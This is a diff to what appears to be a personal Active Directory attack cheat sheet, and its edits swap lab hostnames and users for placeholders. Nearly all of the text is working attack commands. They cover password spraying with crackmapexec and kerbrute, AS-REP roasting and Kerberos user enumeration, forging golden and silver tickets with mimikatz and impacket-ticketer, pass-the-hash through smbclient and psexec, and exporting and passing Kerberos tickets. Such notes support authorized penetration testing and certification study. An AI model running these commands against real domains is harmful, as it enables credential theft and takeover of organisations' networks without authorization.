@@ -34,7 +34,7 @@ crackmapexec smb <IP> -u users.txt -p <pass> -d <domain> --continue-on-success
 
 - kerbrute_windows_amd64.exe
 ```
-.\kerbrute_windows_amd64.exe passwordspray -d <dimain .\usernames.txt "PASS"
+.\kerbrute_windows_amd64.exe passwordspray -d <domain> .\usernames.txt "PASS"
 ```
 
 - PowerView
@@ -66,7 +66,7 @@ tools:
 impacket-GetNPUsers -dc-ip <DC IP> -request -outputfile hashes.asreproast <domain/user_name(to authenticate to DC)>
 
 # without password
-GetNPUsers.py test.local/ -dc-ip 10.10.10.1 -usersfile usernames.txt -format hashcat -outputfile hashes.txt
+GetNPUsers.py test.local/ -dc-ip <IP> -usersfile usernames.txt -format hashcat -outputfile hashes.txt
 
 nmap -p 88 --script="krb5-enum-users" --script-args="krb5-enum-users.realm='$DOMAIN',userdb=$WORDLIST" $IP_DC
 ```
@@ -127,12 +127,12 @@ kerberos::golden /sid:<domain SID> /domain:<domain> /ptt /target:<target> /servi
 
 example:
 ```
-kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
+kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:domain.com /ptt /target:machine.domain.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:admin
 ```
 
 - impacket
 ```
-impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator
+impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain domain.com -spn hostname/machine.domain.com -user-id 500 Administrator
 ```
 
 export the ticket
@@ -217,12 +217,12 @@ tools:
 
 - smbclient connect to smb share
 ```
-smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
+smbclient \\\\<IP>\\<folder> -U <user> --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
 ```
 
 - authenticate to a machine
 ```
-impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
+impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b <user>@<IP>
 ```
 #### Overpass the Hash
 
@@ -247,7 +247,7 @@ sekurlsa::tickets /export
 dir *.kirbi
 
 for example:
-kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
+kerberos::ptt [0;12bd0]-0-0-40810000-admin@name.kirbi
 ```
 
 #### Shadow Copies
